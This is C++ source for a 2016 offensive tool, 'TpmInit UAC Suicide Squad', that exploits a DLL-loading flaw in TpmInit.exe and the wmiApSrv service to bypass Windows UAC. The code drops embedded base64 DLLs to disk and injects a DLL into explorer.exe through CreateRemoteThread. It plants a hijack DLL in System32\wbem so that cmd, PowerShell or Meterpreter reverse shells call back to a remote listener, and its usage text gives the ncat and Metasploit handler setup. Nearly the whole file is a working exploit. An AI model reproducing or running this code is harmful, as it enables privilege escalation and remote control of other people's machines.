/*
   ______                ____      _ __
  /_  __/___  ____ ___  /  _/___  (_) /_
   / / / __ \/ __ `__ \ / // __ \/ / __/
  / / / /_/ / / / / / // // / / / / /_
 /_/ / .___/_/ /_/ /_/___/_/ /_/_/\__/
    /_/
                    UAC Suicide Squad
                      By Cn33liz 2016

A tool to Bypass User Account Control (UAC), to get a High Integrity (or SYSTEM) Reversed Command shell,
a reversed PowerShell session, or a Reversed Meterpreter session.
When TpmInit.exe starts, it first tries to load the wbemcomn.dll within C:\Windows\System32\wbem.
This DLL cannot be found in that folder, so it tries to load the DLL again, but then in C:\Windows\System32.
This tool exploits this DLL loading vulnerability within TpmInit.exe, which runs auto-elevated by default.
Same issue also applies to the WMI Performance Adapter service (wmiApSrv) which runs with SYSTEM privileges.
So while we can use TpmInit.exe to get Elevated priviliges, we can also use it to start the wmiApSrv service,
and get a SYSTEM shell using our custom DLL :)

This version has been succesfully tested on Windows 8.1 x64 and Windows 10 x64 (Version 1511).
*/

#include "stdafx.h"

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#pragma comment(lib, "ws2_32")
#pragma comment(lib, "crypt32.lib") 
#pragma comment(lib, "Cabinet.lib")

#include <winsock2.h>
#include <cstdio>
#include <Windows.h>
#include <string>
#include <stdio.h>
#include <tlhelp32.h>
#include <VersionHelpers.h>
#include <compressapi.h>
#include <wincrypt.h>


EXTERN_C IMAGE_DOS_HEADER __ImageBase;


void Usage(LPWSTR lpProgram) {
	wprintf(L" [>] Usage: First setup a remote Netcat, Ncat or Meterpreter(x64) listener\n");
	wprintf(L" [>] Example: KickAss@PenTestBox:~$ sudo ncat -lvp 443\n\n");
	wprintf(L" [>] Or for msf: KickAss@PenTestBox:~$ sudo msfconsole\n");
	wprintf(L" [>] msf > use exploit/multi/handler\n");
	wprintf(L" [>] msf exploit(handler) > set payload windows/x64/meterpreter/reverse_tcp\n");
	wprintf(L" [>] msf exploit(handler) > set LHOST 10.0.0.1\n");
	wprintf(L" [>] msf exploit(handler) > set LPORT 443\n");
	wprintf(L" [>] msf exploit(handler) > exploit -j\n\n");

	wprintf(L" [>] Then on your target: %s <Remote Listener IP> <Port> <powershell, cmd or msf> <system>\n\n", lpProgram);
	wprintf(L" [>] Example1: Remote Elevated Cmd Shell:   %s 10.0.0.1 443 cmd\n", lpProgram);
	wprintf(L" [>] Example2: Remote SYSTEM Cmd Shell:     %s 10.0.0.1 443 cmd system\n", lpProgram);
	wprintf(L" [>] Example3: Remote Elevated PowerShell:  %s 10.0.0.1 443 powershell\n", lpProgram);
	wprintf(L" [>] Example4: Remote SYSTEM PowerShell:    %s 10.0.0.1 443 powershell system\n", lpProgram);
	wprintf(L" [>] Example5: Remote Elevated Meterpreter: %s 10.0.0.1 443 msf\n", lpProgram);
	wprintf(L" [>] Example6: Remote SYSTEM Meterpreter:   %s 10.0.0.1 443 msf system\n\n", lpProgram);
}

BOOL CheckValidIpAddr(LPCSTR lpIpAddr) {
	unsigned long ulAddr = INADDR_NONE;

	ulAddr = inet_addr(lpIpAddr);
	if (ulAddr == INADDR_NONE) {
		return FALSE;
	}

	if (ulAddr == INADDR_ANY) {
		return FALSE;
	}

	return TRUE;
}

BOOL Base64DecodeAndDecompressDLL(CHAR *Buffer, LPCWSTR lpDecFile)
{
	BOOL Success;
	DECOMPRESSOR_HANDLE Decompressor = NULL;
	PBYTE CompressedBuffer = NULL;
	PBYTE DecompressedBuffer = NULL;
	SIZE_T DecompressedBufferSize, DecompressedDataSize;
	DWORD ByteWritten, BytesRead;
	BOOL bErrorFlag = FALSE;


	// Base64 decode our Buffer.
	DWORD dwSize = 0;
	DWORD strLen = lstrlenA(Buffer);

	CryptStringToBinaryA(Buffer, strLen, CRYPT_STRING_BASE64, NULL, &dwSize, NULL, NULL);

	dwSize++;
	CompressedBuffer = new BYTE[dwSize];
	CryptStringToBinaryA(Buffer, strLen, CRYPT_STRING_BASE64, CompressedBuffer, &dwSize, NULL, NULL);

	//  Create an LZMS decompressor.
	Success = CreateDecompressor(
		COMPRESS_ALGORITHM_LZMS,		//  Compression Algorithm
		NULL,                           //  Optional allocation routine
		&Decompressor);                 //  Handle

	if (!Success)
	{
		return FALSE;
	}

	//  Query decompressed buffer size.
	Success = Decompress(
		Decompressor,                //  Compressor Handle
		CompressedBuffer,            //  Compressed data
		dwSize,						 //  Compressed data size
		NULL,                        //  Buffer set to NULL
		0,                           //  Buffer size set to 0
		&DecompressedBufferSize);    //  Decompressed Data size

									 //  Allocate memory for decompressed buffer.
	if (!Success)
	{
		DWORD ErrorCode = GetLastError();

		// Note that the original size returned by the function is extracted 
		// from the buffer itself and should be treated as untrusted and tested
		// against reasonable limits.
		if (ErrorCode != ERROR_INSUFFICIENT_BUFFER)
		{
			return FALSE;
		}

		DecompressedBuffer = (PBYTE)malloc(DecompressedBufferSize);
		if (!DecompressedBuffer)
		{
			return FALSE;
		}
	}

	//  Decompress data and write data to DecompressedBuffer.
	Success = Decompress(
		Decompressor,               //  Decompressor handle
		CompressedBuffer,           //  Compressed data
		dwSize,						//  Compressed data size
		DecompressedBuffer,         //  Decompressed buffer
		DecompressedBufferSize,     //  Decompressed buffer size
		&DecompressedDataSize);     //  Decompressed data size

	if (!Success)
	{
		return FALSE;
	}

	HANDLE decFile = CreateFile(lpDecFile,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (decFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	bErrorFlag = WriteFile(decFile, DecompressedBuffer, (DWORD)DecompressedDataSize, &ByteWritten, NULL);
	if (FALSE == bErrorFlag)
	{
		CloseHandle(decFile);
		return FALSE;
	}

	CloseHandle(decFile);

	return TRUE;
}


int wmain(int argc, wchar_t* argv[])
{
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	LPCWSTR dllName = L"C:\\Windows\\System32\\wbem\\wbemcomn.dll";


	wprintf(L"   ______           ____     _ __     \n");
	wprintf(L"  /_  __/__  __ _  /  _/__  (_) /_    \n");
	wprintf(L"   / / / _ \\/  ' \\_/ // _ \\/ / __/ \n");
	wprintf(L"  /_/ / .__/_/_/_/___/_//_/_/\\__/    \n");
	wprintf(L"     /_/                              \n");
	wprintf(L"               UAC Suicide Squad      \n");
	wprintf(L"                 By Cn33liz 2016      \n\n");

	if (argc < 4 || argc > 5) {
		Usage(argv[0]);
		exit(1);
	}
	else {

		LPWSTR lpListener = argv[1];
		DWORD dwPort = _wtoi(argv[2]);
		LPWSTR lpShell = CharLower(argv[3]);
		CHAR chIpAddress[32];
		LPWSTR lpSystem = L"";
		if (argc == 5) {
			lpSystem = CharLower(argv[4]);
		}

		size_t mblen = 0;
		wcstombs_s(&mblen, chIpAddress, sizeof(chIpAddress), argv[1], 16);
		if (!CheckValidIpAddr(chIpAddress)) {
			wprintf(L" [!] That's not a valid IP Address, please try again...\n\n");
			exit(1);
		}

		if (!(dwPort > 0 && dwPort <= 65535)) {
			wprintf(L" [!] That's not a valid port, please try again...\n\n");
			exit(1);
		}

		if ((_wcsicmp(L"powershell", lpShell) != 0) && (_wcsicmp(L"cmd", lpShell) != 0) && (_wcsicmp(L"msf", lpShell) != 0)) {
			wprintf(L" [!] That's not a valid shell, please try again...\n\n");
			exit(1);
		}

		if (argc == 5) {
			if (_wcsicmp(L"system", lpSystem) != 0) {
				wprintf(L" [!] That's not a valid argument, please try again...\n\n");
				exit(1);
			}
		}

		wprintf(L" [*] Dropping needed DLL's from memory");

		CHAR *WbemComn = WbemComnB64();
		CHAR *IFileOps = IFileOperationB64();
		if (!Base64DecodeAndDecompressDLL(WbemComn, L"wbemcomn.dll")) {
			wprintf(L" -> Oops something went wrong!\n");
			exit(1);
		}
		if (!Base64DecodeAndDecompressDLL(IFileOps, L"IFileOperation.dll")) {
			wprintf(L" -> Oops something went wrong!\n");
			exit(1);
		}

		wprintf(L" -> Done!\n");

		wprintf(L" [*] Write parameters into config file");

		HANDLE hFile;
		WCHAR chTmpFile[MAX_PATH];
		TCHAR szParams[256];
		GetTempPath(MAX_PATH, chTmpFile);
		wcscat_s(chTmpFile, sizeof(chTmpFile) / sizeof(wchar_t), L"tmpBLABLA.tmp");

		hFile = CreateFile(chTmpFile, // Name of the write
			GENERIC_WRITE,            // Open for writing
			0,                        // Do not share
			NULL,                     // Default security
			CREATE_ALWAYS,            // Creates a new file, always.
			FILE_ATTRIBUTE_NORMAL,    // Normal file
			NULL);                    // No attr. template

		if (hFile == INVALID_HANDLE_VALUE)
		{
			wprintf(L" -> Oops something went wrong!\n");
			exit(1);
		}

		_sntprintf_s(szParams, sizeof(szParams) / sizeof(TCHAR), _TRUNCATE, L"%ls %i %ls %s", lpListener, dwPort, lpShell, lpSystem);

		mblen = 0;
		CHAR chParams[64];
		wcstombs_s(&mblen, chParams, sizeof(chParams), szParams, 64);

		DWORD dwBytesToWrite = (strlen(chParams) * sizeof(char)); // include the NULL terminator
		DWORD dwBytesWritten = 0;
		BOOL bErrorFlag = FALSE;

		bErrorFlag = WriteFile(
			hFile,            // Open file handle
			chParams,         // Start of data to write
			dwBytesToWrite,   // Number of bytes to write
			&dwBytesWritten,  // Number of bytes that were written
			NULL);            // No overlapped structure

		if (FALSE == bErrorFlag)
		{
			wprintf(L" -> Oops something went wrong!\n");
			exit(1);
		}

		CloseHandle(hFile);

		if (_wcsicmp(L"msf", lpShell) == 0) {
			LPCWSTR lpMsfdllName = L"MsfStager.dll";
			WCHAR chMsfFile[MAX_PATH];
			CHAR *MsfStager = MsfStagerB64();

			GetTempPath(MAX_PATH, chMsfFile);
			wcscat_s(chMsfFile, sizeof(chMsfFile) / sizeof(wchar_t), L"tmpMSFBLA.tmp");	
			//if (!CopyFile(lpMsfdllName, chMsfFile, FALSE)) {
			if (!Base64DecodeAndDecompressDLL(MsfStager, chMsfFile)) {
				wprintf(L" -> Oops something went wrong!\n");
				exit(1);
			}
		}

		wprintf(L" -> Done!\n");
		
		wprintf(L" [*] Now injecting the IFileOperation DLL into explorer.exe process....\n");
		wprintf(L" [*] And use the IFileOperation::CopyItem method to copy our DLL");

		DWORD pid = 0;
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		PROCESSENTRY32 process;
		ZeroMemory(&process, sizeof(process));

		process.dwSize = sizeof(process);
		if (Process32First(snapshot, &process))
		{
			do
			{
				if (wcscmp(process.szExeFile, L"explorer.exe") == 0)
				{
					pid = process.th32ProcessID;
					break;
				}
			} while (Process32Next(snapshot, &process));
		}

		CloseHandle(snapshot);
		if (pid == 0)
			return -1;
		auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
		HANDLE hThread;
		WCHAR DllPath[MAX_PATH] = { 0 };

		GetModuleFileName((HINSTANCE)&__ImageBase, DllPath, _countof(DllPath));
		std::wstring path(DllPath);
		const size_t last = path.rfind('\\');
		if (std::wstring::npos != last)
		{
			path = path.substr(0, last + 1);
		}
		path += L"IFileOperation.dll";

		void* pLibRemote;
		DWORD hLibModule;
		HMODULE hKernel32 = ::GetModuleHandle(L"Kernel32");
		pLibRemote = ::VirtualAllocEx(hProcess, NULL, sizeof(wchar_t)*(path.length() + 1),
			MEM_COMMIT, PAGE_READWRITE);
		WriteProcessMemory(hProcess, pLibRemote, (void*)path.data(),
			sizeof(wchar_t)*(path.length() + 1), NULL);
		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW"), pLibRemote, 0, NULL);
		auto e = GetLastError();
		WaitForSingleObject(hThread, INFINITE);
		GetExitCodeThread(hThread, &hLibModule);
		CloseHandle(hThread);
		VirtualFreeEx(hProcess, pLibRemote, sizeof(wchar_t)*(path.length() + 1), MEM_RELEASE);

		/* Not needed... Our DLL will Self Destruct ;)
		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "FreeLibrary"), (void*)hLibModule, 0, NULL);
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);*/


		hFind = FindFirstFile(dllName, &FindFileData);
		if (hFind == INVALID_HANDLE_VALUE)
		{
			wprintf(L" -> Oops something went wrong!\n");
			return 1;
		}
		else
		{
			wprintf(L" -> Done!\n");
			FindClose(hFind);
		}

		if (_wcsicmp(L"system", lpSystem) == 0) {
			wprintf(L" [*] Let's use TpmInit.exe to start the wmiApSrv service, enable all privs and see if we get a session...\n");
		}
		else {
			wprintf(L" [*] Let's start TpmInit.exe, enable all privs and see if we get a session...\n");
		}

		//Not Needed... TpmInit.exe is started from within our injected IFileOperation DLL.
		//ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\TpmInit.exe", NULL, NULL, SW_HIDE);
		//Sleep(1000);

		wprintf(L" [*] Have fun!\n\n");

		DeleteFile(L"wbemcomn.dll");
		DeleteFile(L"IFileOperation.dll");

		return 0;
	}
}
